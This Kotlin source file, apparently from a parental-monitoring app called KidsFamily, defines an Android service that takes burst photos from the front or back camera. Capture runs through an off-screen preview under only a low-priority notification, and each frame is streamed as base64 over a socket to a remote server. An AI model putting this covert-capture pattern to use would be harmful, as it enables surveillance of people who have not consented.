package com.xixfamily.kids.service

import android.app.*
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.hardware.Camera
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Base64
import android.util.Log
import android.view.SurfaceHolder
import android.view.SurfaceView
import androidx.core.app.NotificationCompat
import com.xixfamily.kids.network.SocketManager
import com.xixfamily.kids.ui.main.MainActivity
import org.json.JSONObject
import java.io.ByteArrayOutputStream

@Suppress("DEPRECATION")
class CameraBurstService : Service() {
    companion object { private const val TAG = "CamBurst"; private const val NID = 2025; private const val CID = "kidsfamily_camburst"; private const val INTERVAL = 500L; private const val Q = 40; private const val MW = 640; private const val MH = 480 }
    private var cam: Camera? = null; private var sv: SurfaceView? = null; private var sh: SurfaceHolder? = null
    private val handler = Handler(mainLooper); private var capturing = false; private var count = 0; private var max = 10; private var front = true
    private val run = object : Runnable() { override fun run() { if (!capturing || count >= max) { stopBurst(); return }; shoot(); count++; handler.postDelayed(this, INTERVAL) } }
    override fun onCreate() { super.onCreate(); createChannel(); startForeground(NID, notif("Camera burst ready")) }
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        when (i?.action) { "STOP" -> stopBurst(); else -> { front = i?.getBooleanExtra("useFrontCamera", true) ?: true; max = i?.getIntExtra("maxBurst", 10) ?: 10; startBurst() } }
        return START_STICKY
    }
    private fun startBurst() {
        if (capturing) return; capturing = true; count = 0
        try {
            val cid = getCamId(front); cam = Camera.open(cid)
            cam?.parameters?.let { val sizes = it.supportedPictureSizes; val opt = getOptimal(sizes, MW, MH); if (opt != null) { it.setPictureSize(opt.width, opt.height) }; it.setRotation(if (front) 270 else 90); it.jpegQuality = Q; cam?.parameters = it }
            sv = SurfaceView(this); sh = sv?.holder
            sh?.addCallback(object : SurfaceHolder.Callback {
                override fun surfaceCreated(h: SurfaceHolder) { try { cam?.setPreviewDisplay(h); cam?.startPreview(); handler.post(run) } catch (e: Exception) { Log.e(TAG, "Surface: ${e.message}") } }
                override fun surfaceChanged(p0: SurfaceHolder, p1: Int, p2: Int, p3: Int) {}; override fun surfaceDestroyed(p0: SurfaceHolder) {}
            }); sh?.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS)
        } catch (e: Exception) { Log.e(TAG, "Error: ${e.message}"); capturing = false; stopSelf() }
    }
    private fun shoot() {
        try { cam?.takePicture(null, null, Camera.PictureCallback { data, c ->
            try { val b = BitmapFactory.decodeByteArray(data, 0, data.size); if (b != null) { val s = scale(b, MW, MH); val baos = ByteArrayOutputStream(); s.compress(Bitmap.CompressFormat.JPEG, Q, baos); val enc = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                    val sk = SocketManager.getInstance(); if (sk.isSocketConnected()) { sk.emit("camera:burst:frame", JSONObject().apply { put("imageBase64", enc); put("sequence", count); put("isFrontCamera", front); put("timestamp", System.currentTimeMillis()) }); Log.d(TAG, "Frame $count/$max") }
                    if (!s.isRecycled) s.recycle(); if (!b.isRecycled) b.recycle() }; baos.close(); c.startPreview()
            } catch (e: Exception) { Log.e(TAG, "Proc: ${e.message}") } })
        } catch (e: Exception) { Log.e(TAG, "Shoot: ${e.message}") }
    }
    private fun stopBurst() { capturing = false; handler.removeCallbacks(run); try { cam?.apply { stopPreview(); release() }; cam = null } catch (_: Exception) {}; stopForeground(STOP_FOREGROUND_REMOVE); stopSelf(); Log.d(TAG, "Done: $count photos") }
    private fun getCamId(front: Boolean): Int { val info = Camera.CameraInfo(); for (i in 0 until Camera.getNumberOfCameras()) { Camera.getCameraInfo(i, info); if (info.facing == (if (front) Camera.CameraInfo.CAMERA_FACING_FRONT else Camera.CameraInfo.CAMERA_FACING_BACK)) return i }; return 0 }
    private fun getOptimal(sizes: List<Camera.Size>, w: Int, h: Int): Camera.Size? { var best: Camera.Size? = null; for (sz in sizes) { if (sz.width <= w && sz.height <= h && (best == null || sz.width * sz.height > best.width * best.height)) best = sz }; return best }
    private fun scale(b: Bitmap, mw: Int, mh: Int): Bitmap { val r = minOf(mw.toFloat() / b.width, mh.toFloat() / b.height, 1.0f); if (r >= 1f) return b; return Bitmap.createScaledBitmap(b, (b.width * r).toInt(), (b.height * r).toInt(), true) }
    override fun onBind(i: Intent?): IBinder? = null; override fun onDestroy() { stopBurst(); super.onDestroy() }
    private fun createChannel() { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { val c = NotificationChannel(CID, "Camera", NotificationManager.IMPORTANCE_LOW); c.setShowBadge(false); getSystemService(NotificationManager::class.java).createNotificationChannel(c) } }
    private fun notif(t: String): Notification { val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT); return NotificationCompat.Builder(this, CID).setContentTitle("KidsFamily").setContentText(t).setSmallIcon(android.R.drawable.ic_menu_camera).setContentIntent(pi).setOngoing(true).setPriority(NotificationCompat.PRIORITY_LOW).build() }
}
